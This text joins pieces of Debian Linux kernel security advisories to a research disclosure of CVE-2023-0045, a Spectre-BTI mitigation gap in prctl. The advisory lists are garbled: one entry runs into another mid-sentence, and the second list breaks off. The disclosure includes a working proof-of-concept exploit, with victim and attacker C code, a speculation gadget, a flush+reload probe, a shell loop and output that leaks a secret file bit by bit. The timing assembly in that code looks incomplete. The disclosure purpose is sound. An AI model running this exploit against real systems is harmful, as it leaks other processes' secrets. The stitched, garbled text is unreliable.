Debian Bug     : 989705 993612 1022126 1031753

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service, or information
leak.

CVE-2022-2196

    A regression was discovered the KVM implementation for Intel CPUs,
    affecting Spectre v2 mitigation for nested virtualisation.  When
    KVM was used as the L0 hypervisor, an L2 guest could exploit this
    to leak sensitive information from its L1 hypervisor.

CVE-2022-3424

    Zheng Wang and Zhuorao Yang reported a flaw in the SGI GRU driver
    which could lead to a use-after-free.  On systems where this driver
    is used, a local user can explit this for denial of service (crash
    or memory corruption) or possibly for privilege escalation.

    This driver is not enabled in Debian's official kernel
    configurations.

CVE-2022-3707

    Zheng Wang reported a flaw in the i915 graphics driver's
    virtualisation (GVT-g) support that could lead to a double-free.
    On systems where this feature is used, a guest can exploit this
    for denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2022-4129

    Haowei Yan reported a race condition in the L2TP protocol
    implementation which could lead to a null pointer dereference.  A
    local user could exploit this for denial of service (crash).

CVE-2022-4379

    Xingyuan Mo reported a flaw in the NFSv4.2 inter server to
    server copy implementation which could lead to a use-after-free.

    This feature is not enabled in Debian's official kernel
    configurations.

CVE-2023-0045

    Rodrigo Branco and Rafael Correa De Ysasi reported that when a
    user-space task told the kernel to enable Spectre v2 mitigation
    for it, the mitigation was not enabled until the task was next
    rescheduled.  This might be exploitable by a local or remote
    attacker to leak sensitive information from such an application.

CVE-2023-0458

    Jordy Zimmer and Alexandra Sandulescu found that getrlimit() and
    related system calls were vulnerable to speculative execution
    attacks such as Spectre v1.  A local user could explot this to
    leak sensitive information from the kernel.

CVE-2023-0459

    Jordy Zimmer and Alexandra Sandulescu found a regression in
    Spectre v1 mitigation in the user-copy functions for the amd64
    (64-bit PC) architecture.  Where the CPUs do not implement SMAP or
    it is disabled, a local user could exploit this to leak sensitive
    information from the kernel.  Other architectures may also be
    affected.

CVE-2023-0461

    "slipper" reported a flaw in the kernel's support for ULPs (Upper
    Layer Protocols) on top of TCP that can lead to a double-free when
    using kernel TLS sockets.  A local user can exploit this for
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

    Kernel TLS is not enabled in Debian's official kernel
    configurations.

CVE-2023-1073

    Pietro Borrello reported a type confusion flaw in the HID (Human
    Interface Device) subsystem.  An attacker able to insert and
    remove USB devices might be able to use this to cause a denial of
    service (crash or memory corruption) or possibly to run arbitrary
    code in the kernel.

CVE-2023-1074

    Pietro Borrello reported a type confusion flaw in the SCTP
    protocol implementation which can lead to a memory leak.  A local
    user could exploit this to cause a denial of service (resource
    exhaustion).

CVE-2023-1076

    Pietro Borrello reported a type confusion flaw in the TUN/TAP
    network driver, which results in all TUN/TAP sockets being marked
    as belonging to user ID 0 (root).  This may allow local users to
    evade local firewall rules based on user ID.

CVE-2023-1077

    Pietro Borrello reported a type confusion flaw in the task
    scheduler.  A local user might be able to exploit this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2023-1078

    Pietro Borrello reported a type confusion flaw in the RDS protocol
    implementation.  A local user could exploit this to cause a denial
    of service (crash or memory corruption) or possibly for privilege
    escalation.

CVE-2023-1079

    Pietro Borrello reported a race condition in the hid-asus HID
    driver which could lead to a use-after-free.  An attacker able to
    insert and remove USB devices can use this to cause a denial of
    service (crash or memory corruption) or possibly to run arbitrary
    code in the kernel.

CVE-2023-1118

    Duoming Zhou reported a race condition in the ene_ir remote
    control driver that can lead to a use-after-free if the driver
    is unbound.  It is not clear what the security impact of this is.

CVE-2023-1281, CVE-2023-1829

    "valis" reported two flaws in the cls_tcindex network traffic
    classifier which could lead to a use-after-free.  A local user can
    exploit these for privilege escalation.  This update removes
    cls_tcindex entirely.

CVE-2023-1513

    Xingyuan Mo reported an information leak in the KVM implementation
    for the i386 (32-bit PC) architecture.  A local user could exploit
    this to leak sensitive information from the kernel.

CVE-2023-1611

    "butt3rflyh4ck" reported a race condition in the btrfs filesystem
    driver which can lead to a use-after-free.  A local user could
    exploit this to cause a denial of service (crash or memory
    corruption) or possibly for privilege escalation.

CVE-2023-1670

    Zheng Wang reported a race condition in the xirc2ps_cs network
    driver which can lead to a use-after-free.  An attacker able to
    insert and remove PCMCIA devices can use this to cause a denial of
    service (crash or memory corruption) or possibly to run arbitrary
    code in the kernel.

CVE-2023-1855

    Zheng Wang reported a race condition in the xgene-hwmon hardware
    monitoring driver that may lead to a use-after-free.  It is not
    clear what the security impact of this is.

CVE-2023-1859

    Zheng Wang reported a race condition in the 9pnet_xen transport
    for the 9P filesystem on Xen, which can lead to a use-after-free.
    On systems where this feature is used, a backend driver in another
    domain can use this to cause a denial of service (crash or memory
    corruption) or possibly to run arbitrary code in the vulnerable
    domain.

CVE-2023-1872

    Bing-Jhong Billy Jheng reported a race condition in the io_uring
    subsystem that can lead to a use-after-free.  A local user could
    exploit this to cause a denial of service (crash or memory
    corruption) or possibly for privilege escalation.

CVE-2023-1989

    Zheng Wang reported a race condition in the btsdio Bluetooth
    adapter driver that can lead to a use-after-free.  An attacker
    able to insert and remove SDIO devices can use this to cause a
    denial of service (crash or memory corruption) or possibly to run
    arbitrary code in the kernel.

CVE-2023-1990

    Zheng Wang reported a race condition in the st-nci NFC adapter
    driver that can lead to a use-after-free.  It is not clear what
    the security impact of this is.

    This driver is not enabled in Debian's official kernel
    configurations.

CVE-2023-1998

    JosÃ© Oliveira and Rodrigo Branco reported a regression in Spectre
    v2 mitigation for user-space on x86 CPUs supporting IBRS but not
    eIBRS.  This might be exploitable by a local or remote attacker to
    leak sensitive information from a user-space application.

CVE-2023-2162

    Mike Christie reported a race condition in the iSCSI TCP transport
    that can lead to a use-after-free.  On systems where this feature
    is used, a local user might be able to use this to cause a denial
    of service (crash or memory corruption) or possibly for privilege
    escalation.

CVE-2023-2194

    Wei Chen reported a potential heap buffer overflow in the
    i2c-xgene-slimpro IÂ²C adapter driver.  A local user with
    permission to access such a device can use this to cause a denial
    of service (crash or memory corruption) and probably for privilege
    escalation.

CVE-2023-22998

    Miaoqian Lin reported an incorrect error check in the virtio-gpu
    GPU driver.  A local user with access to such a device might be
    able to use this to cause a denial of service (crash).

CVE-2023-23004

    Miaoqian Lin reported an incorrect error check in the mali-dp GPU
    driver.  A local user with access to such a device might be able
    to use this to cause a denial of service (crash).

CVE-2023-23559

    Szymon Heidrich reported incorrect bounds checks in the rndis_wlan
    Wi-Fi driver which may lead to a heap buffer overflow or overread.
    An attacker able to insert and remove USB devices can use this to
    cause a denial of service (crash or memory corruption) or
    information leak, or possibly to run arbitrary code in the kernel.

CVE-2023-25012

    Pietro Borrello reported a race condition in the hid-bigbenff HID
    driver which could lead to a use-after-free.  An attacker able to
    insert and remove USB devices can use this to cause a denial of
    service (crash or memory corruption) or possibly to run arbitrary
    code in the kernel.

CVE-2023-26545

    Lianhui Tang reported a flaw in the MPLS protocol implementation
    that could lead to a double-free.  A local user might be able to
    exploit this to cause a denial of service (crash or memory
    corruption) or possibl for privilege escalation.

CVE-2023-28328

    Wei Chen reported a flaw in the az6927 DVB driver that can lead to
    a null pointer dereference.  A local user permitted to access an
    IÂ²C adapter device that this driver creates can use this to cause
    a denial of service (crash).

CVE-2023-28466

    Hangyu Hua reported a race condition in the kernel TLS socket
    implementation which can lead to a use-after-free or null
    pointer dereference.  A local user can exploit this for
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

    This feature is not enabled in Debian's official kernel
    configurations.

CVE-2023-30456

    Reima ISHII reported a flaw in the KVM implementation for Intel
    CPUs affecting nested virtualisation.  When KVM was used as the L0
    hypervisor, and EPT and/or unrestricted guest mode was disabled,
    it did not prevent an L2 guest from being configured with an
    architecturally invalid protection/paging mode.  A malicious guest
    could exploit this to cause a denial of service (crash).

Debian Bug     : 825141

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service, or information
leak.

CVE-2022-2873

    Zheyu Ma discovered that an out-of-bounds memory access flaw in
    the Intel iSMT SMBus 2.0 host controller driver may result in
    denial of service (system crash).

CVE-2022-3424

    Zheng Wang and Zhuorao Yang reported a flaw in the SGI GRU driver
    which could lead to a use-after-free.  On systems where this driver
    is used, a local user can explit this for denial of service (crash
    or memory corruption) or possibly for privilege escalation.

    This driver is not enabled in Debian's official kernel
    configurations.

CVE-2022-3545

    It was discovered that the Netronome Flow Processor (NFP) driver
    contained a use-after-free flaw in area_cache_get(), which may
    result in denial of service or the execution of arbitrary code.

CVE-2022-3707

    Zheng Wang reported a flaw in the i915 graphics driver's
    virtualisation (GVT-g) support that could lead to a double-free.
    On systems where this feature is used, a guest can exploit this
    for denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2022-4744

    The syzkaller tool found a flaw in the TUN/TAP network driver,
    which can lead to a double-free.  A local user can exploit this
    for denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2022-36280

    An out-of-bounds memory write vulnerability was discovered in the
    vmwgfx driver, which may allow a local unprivileged user to cause
    a denial of service (system crash).

CVE-2022-41218

    Hyunwoo Kim reported a use-after-free flaw in the Media DVB core
    subsystem caused by refcount races, which may allow a local user
    to cause a denial of service or escalate privileges.

    An integer overflow in l2cap_config_req() in the Bluetooth
    subsystem was discovered, which may allow a physically proximate
    attacker to cause a denial of service (system crash).

CVE-2022-47929

    Frederick Lawler reported a NULL pointer dereference in the
    traffic control subsystem allowing an unprivileged user to cause a
    denial of service by setting up a specially crafted traffic
    control configuration.

CVE-2023-0045

    Rodrigo Branco and Rafael Correa De Ysasi reported that when a
    user-space task told the kernel to enable Spectre v2 mitigation
    for it, the mitigation was not enabled until the task was next
    rescheduled.  This might be exploitable by a local or remote
    attacker to leak sensitive information from such an application.

CVE-2023-0266

    A use-after-free flaw in the sound subsystem due to missing
    locking may result in denial of service or privilege escalation.

    related system calls were vulnerable to speculative execution
    attacks such as Spectre v1.  A local user could explot this to
    leak sensitive information from the kernel.

CVE-2023-0459

    Jordy Zimmer and Alexandra Sandulescu found a regression in
    Spectre v1 mitigation in the user-copy functions for the amd64
    (64-bit PC) architecture.  Where the CPUs do not implement SMAP or
    it is disabled, a local user could exploit this to leak sensitive
    information from the kernel.  Other architectures may also be
    affected.

CVE-2023-0461

    "slipper" reported a flaw in the kernel's support for ULPs (Upper
    Layer Protocols) on top of TCP that can lead to a double-free when
    using kernel TLS sockets.  A local user can exploit this for

## Description

### Summary

When testing the success rate of Spectre-BTI attacks, we detected a strange pattern when using the kernel API as mitigation [[1](https://docs.kernel.org/userspace-api/spec_ctrl.html)]. Our tests revealed that the Linux kernel fails to correctly mitigate the attack leaving the process exposed for a short period of time after the syscall.

Further investigation showed that the kernel does not issue an IBPB immediately during the syscall. The `ib_prctl_set` [[2](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467)] function updates the Thread Information Flags (TIFs) for the task and updates the SPEC\_CTRL MSR on the function `__speculation_ctrl_update` [3], but the IBPB is only issued on the next schedule, when the TIF bits are checked. This leaves the victim vulnerable to values already injected on the BTB, prior to the prctl syscall. The behavior is only corrected after a reschedule of the taks happens. Furthermore, the kernel entrance (due to the syscall itself), does not issue an IBPB in the default scenarios (i.e., when the kernel protects itself via retpoline or eIBRS).

Executing a prctl to mitigate spectre-BTI attacks using:  `prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);` leads to the `ib_prctl_set` [[2](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467)] function on kernel 5.15. When the option SPEC\_DISABLE is used the TIF bit for `task_set_spec_ib_disable` is set and `task_update_spec_tif` is called:

```
static int ib_prctl_set(struct task_struct *task, unsigned long ctrl) [...]
case PR_SPEC_FORCE_DISABLE:
/*
* Indirect branch speculation is always allowed when
* mitigation is force disabled.
*/
if (spectre_v2_user_ibpb == SPECTRE_V2_USER_NONE &&
spectre_v2_user_stibp == SPECTRE_V2_USER_NONE)
return -EPERM;
if (!is_spec_ib_user_controlled())
return 0;
task_set_spec_ib_disable(task);
if (ctrl == PR_SPEC_FORCE_DISABLE)
task_set_spec_ib_force_disable(task);
task_update_spec_tif(task);
break; ```

```

`task_set_spec_ib_disable` calls `set_tsk_thread_flag(tsk, TIF_SPEC_FORCE_UPDATE);` and if the target task is the current process it calls `speculation_ctrl_update_current();`

```
static void task_update_spec_tif(struct task_struct *tsk)
{
/* Force the update of the real TIF bits */
set_tsk_thread_flag(tsk, TIF_SPEC_FORCE_UPDATE);
/*
* Immediately update the speculation control MSRs for the current * task, but for a non-current task delay setting the CPU
* mitigation until it is scheduled next.
*
* This can only happen for SECCOMP mitigation. For PRCTL it's
* always the current task.
*/
if (tsk == current)
speculation_ctrl_update_current();
}

```

The  `speculation_ctrl_update_current` after the `speculation_ctrl_update` wrapper executes `__speculation_ctrl_update` with `tifp = ~tifp` , here the update of the wrmsr for setting STIBP is executed but no IBPB is issued :

```

static __always_inline void __speculation_ctrl_update(unsigned long tifp, unsigned long tifn)

{
unsigned long tif_diff = tifp ^ tifn;
u64 msr = x86_spec_ctrl_base;
bool updmsr = false;
lockdep_assert_irqs_disabled();
/* Handle change of TIF_SSBD depending on the mitigation method. */
if (static_cpu_has(X86_FEATURE_VIRT_SSBD)) {
if (tif_diff & _TIF_SSBD)
amd_set_ssb_virt_state(tifn);
} else if (static_cpu_has(X86_FEATURE_LS_CFG_SSBD)) {
if (tif_diff & _TIF_SSBD)
amd_set_core_ssb_state(tifn);

} else if (static_cpu_has(X86_FEATURE_SPEC_CTRL_SSBD) ||
static_cpu_has(X86_FEATURE_AMD_SSBD)) {
updmsr |= !!(tif_diff & _TIF_SSBD);
msr |= ssbd_tif_to_spec_ctrl(tifn);
}
/* Only evaluate TIF_SPEC_IB if conditional STIBP is enabled. */
if (IS_ENABLED(CONFIG_SMP) &&
static_branch_unlikely(&switch_to_cond_stibp)) {
updmsr |= !!(tif_diff & _TIF_SPEC_IB);
msr |= stibp_tif_to_spec_ctrl(tifn);
}
if (updmsr)
wrmsrl(MSR_IA32_SPEC_CTRL, msr);

}

```

The seccomp syscall also uses `ib_prctl_set` [[2](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/cpu/bugs.c#L1467)] as mitigation, inside

`arch_seccomp_spec_mitigate`  [4] so the same result is expected with seccomp.

### Severity

Low - Severity justification currently being reworked.

### Proof of Concept

To ensure this wasn't a measurement error, we created a simple POC. The victim code always executes a`safe_function` through a function pointer that is vulnerable to a spectre-BTI attack. The victim requests the kernel for protection using the prctl syscall (inside `protect_me`). The victim also loads a secret from a text file, showing that other syscalls donâ€™t check the TIF bit or provoke a reschedule that would force an IBPB.

```
//gcc -o victim victim.c -O0 -masm=intel -no-pie -fno-stack-protector
#include "common.h"

int main(int argc, char *argv[])
{

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("running victim %s\n", argv[1]);

    //only call safe_function
    codePtr = safe_function;
    char secret[20];
    char *sharedmem = open_shared_mem();
    unsigned idx = string_to_unsigned(argv[1]);

    //call for prctl to protect this process
    protect_me();

    //only then load the secret into memory
    load_secret(secret);

    for (int i = 0; i < 100; i++)
    {
        flush((char *)&codePtr);
        //this arguments are never used on safe_function, but they match the signature of spectre_gadget, that should never be called
        //Since prctl is called, it shouldn't be possible for an attacker to poison the BTB and leak the secret
        spec(&sharedmem[2000], secret, idx);
    }
}

```

Most of the libc functions were placed inside a common header between the attacker and the victim, so the `spectre_gadget` and `spec` functions share the same memory addresses on both victim and attacker (otherwise a .GOT entry is created and the addresses are changed). This is not a requirement and there are other ways to place the branches on the same addresses and mimic the victim context, but this method is the simplest.

```
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/prctl.h>

char unused[0x1000];
void (*codePtr)(char *, char *, unsigned idx);
char unused2[0x1000];

// this function does nothing. Always called by the victim
void safe_function(char *a, char *b, unsigned idx)
{
}

// this function is never called by the victim
void spectre_gadget(char *addr, char *secret, unsigned idx)
{
    volatile char d;
    if ((secret[idx / 8] >> (idx % 8)) & 1)
        d = *addr;
}

// helper for better results probably not necessary but makes the tests easier
void flush(char *adrs)
{
    asm volatile(
        "clflush [%0]                   \n"
        :
        : "c"(adrs)
        :);
}

// This function is vulnerable to a spectre-BTI attack.
void spec(char *addr, char *secret, unsigned idx)
{

    for (register int i = 0; i < 30; i++)
        ;
    codePtr(addr, secret, idx);
}

// opens file as read only in memory to be used as side channel, but could be any other COW file like libc for example
char *open_shared_mem()
{
    int fd = open("sharedmem", O_RDONLY);
    char *res = (char *)mmap(NULL, 0x1000, PROT_READ, MAP_PRIVATE, fd, 0);
    // ensure page is on memory
    volatile char d = res[2100];
    return res;
}

// load secret from file
void load_secret(char *secret)
{
    FILE *fp = fopen("secret.txt", "r");
    fgets(secret, 20, (FILE *)fp);
}

// Calls prctl to protect the user against spectre-BTI attacks - https://docs.kernel.org/userspace-api/spec_ctrl.html
void protect_me()
{
    usleep(1000); //not needed but resets the available time on scheduler
    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);
}

// Utility. All utility functions are placed on common so the spec function matches the same address on both victim and attacker. This is not necessary but makes the tests easier
unsigned string_to_unsigned(char *s)
{
    return atoi(s);
}

```

The attack consists in poisoning the BTB by calling the `spec` function and making it branch to `spectre_gadget` instead of `safe_function`. After the training the victim process is created and it executes `spec` that mispredicts to `spectre_gadget` which should never be executed. The secret is leaked through a classic flush+reload side channel.

```
//gcc -o attacker attacker.c -O0 -masm=intel -no-pie -fno-stack-protector
#include "common.h"

#define PRINTNUM 1000

unsigned probe(char *adrs)
{
    volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"

        : "=a"(time)
        : "c"(adrs)
        : "%esi", "%edx");
    return time;
}

int main(int argc, char *argv[])
{

    //Make spec function confuse safe_function with spectre_gadget
    codePtr = spectre_gadget;

    char dummy;
    int hits = 0;
    int tries = 0;
    char *sharedmem = open_shared_mem();
    setvbuf(stdout, NULL, _IONBF, 0);

    while (1)
    {
        //Inject the target in the BTB
        spec(&dummy, &dummy, 0);

        //Allow for victim to execute and misspredict to spectre_gadget
        usleep(1);

        //probe the 1-bit flush+reload side channel
        if (probe((char *)&sharedmem[2000]) < 0x90)
        {
            printf("+");
        }
    }
}

```

Since the victim receives an argument that can be used to choose the bit to be leaked through the side channel, we can execute the victim process multiple times while the attacker is executing:

```
taskset -c 0 ./attacker >> result.txt &

for i in {0..144}
do
    echo "Leaking bit $i... "
    echo -e -n "Leaking bit $i: " >> result.txt
    sleep .01
    for j in {0..10}
    do
        taskset -c 0 ./victim $i >/dev/null
    done

    echo "" >> result.txt
done

python3 parseResult.py

make clean
echo -e "killing attacker"
kill -9 $(pidof attacker)

```

This leaves the following text file:

```
Leaking bit 0: +++++++++++
Leaking bit 1:
Leaking bit 2:
Leaking bit 3:
Leaking bit 4:
Leaking bit 5:
Leaking bit 6: ++++++++++
Leaking bit 7:
Leaking bit 8: ++++++++
[...]

```

Note that bit 0 and 6 are 1, therefore the first character must be 0x41(A). Parsing the file with a simple Python script shows:`The secret leaked is: b'Asuper_secret_flag'` which is the exact content present in `secret.txt` used by the victim.

Changing the prctl call for seccomp to `syscall(SYS_seccomp,SECCOMP_SET_MODE_STRICT,0,0);` after loading the secret doesn't prevent the attack. This is expected since internally both use the same `ib_prctl_set` function to implement the mitigation.

### Further Analysis

The current implementation of the prctl syscall for speculative control fails to protect the user against attackers executing before the mitigation. The `seccomp` mitigation also fails in this scenario.

The patch that added support for the conditional mitigation via prctl (ib\_prctl\_set) dates back to the kernel 4.9.176. It appears to have been introduced on Nov 28, 2018 in the following commit: [torvalds/linux@9137bb2](https://github.com/torvalds/linux/commit/9137bb27e60e554dab694eafa4cca241fa3a694f) and the current `__speculation_ctrl_update` code that sets the MSRs, but without the immediate IBPB, was added on the same day in the following commit: [torvalds/linux@01daf56](https://github.com/torvalds/linux/commit/01daf56875ee0cd50ed496a09b20eb369b45dfa5). This indicates that the issue has been present in the kernel for about 4 years.

#### Mitigations

For user-mode applications, a `usleep` after the prctl call is enough to force a reschedule and ensure the correct mitigation. One possible kernel patch for this attack is to issue the IBPB just after the STIBP is set, on `__speculation_ctrl_update` [[3](https://elixir.bootlin.com/linux/v5.15.56/source/arch/x86/kernel/process.c#L557)] or to call schedule(). After discussing with the Linux Kernel Security Team, that is what was decided, and the following commit has the fix: <https://git.kernel.org/pub/scm/linux/kernel/git/tip/tip.git/commit/?id=a664ec9158eeddd75121d39c9a0758016097fa96>.
